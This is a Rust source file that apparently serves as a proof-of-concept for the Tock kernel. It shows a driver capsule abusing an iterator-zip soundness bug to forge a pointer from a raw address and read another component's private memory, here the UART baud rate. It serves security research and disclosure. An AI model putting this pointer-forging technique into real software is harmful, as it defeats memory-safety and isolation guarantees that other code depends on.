//! Demonstration of how the language level inter-capsule protections of
//! tock can be subverted using an unsafe bug.

use kernel::debug;
use kernel::hil::uart;

pub struct RudraDriver {}

impl RudraDriver {
    pub fn new() -> Self {
        // Reach into the UartMuxComponents's memory and read out the baud
        // rate for the uart connection.
        let uart_addr : usize = 0x80002154;

        let uart : &UartMuxComponentInternals = transmute_ref(
            uart_addr as *const UartMuxComponentInternals);

        debug!("RudraDriver: serial connection is using baud: {}", uart.baud_rate);

        RudraDriver {}
    }
}

struct UartMuxComponentInternals {
    _ignored: &'static dyn uart::Uart<'static>,
    baud_rate: u32,
}


struct ArrayAndPointer<T: 'static> {
    arr: [usize; 1],
    ptr: Option<&'static mut T>,
}

fn transmute_ref<T>(ptr: *const T) -> &'static mut T {
    let mut arr_and_ptr = ArrayAndPointer { arr: [1], ptr: None };
    let mut other_arr = [1];
    let zip = overflowed_zip(&mut arr_and_ptr.arr).zip(overflowed_zip(&mut other_arr));

    let overwrite_ptr = zip.map(|((num, _), _)| num).skip(1).next().unwrap();
    *overwrite_ptr = ptr as usize;

    arr_and_ptr.ptr.unwrap()
}

fn overflowed_zip(arr: &mut [usize]) -> impl Iterator<Item = (&mut usize, &())> {
    static UNIT_EMPTY_ARR: [(); 0] = [];

    let mapped = arr.into_iter().map(|i| i);
    let mut zipped = mapped.zip(UNIT_EMPTY_ARR.iter());
    zipped.next();
    zipped
}
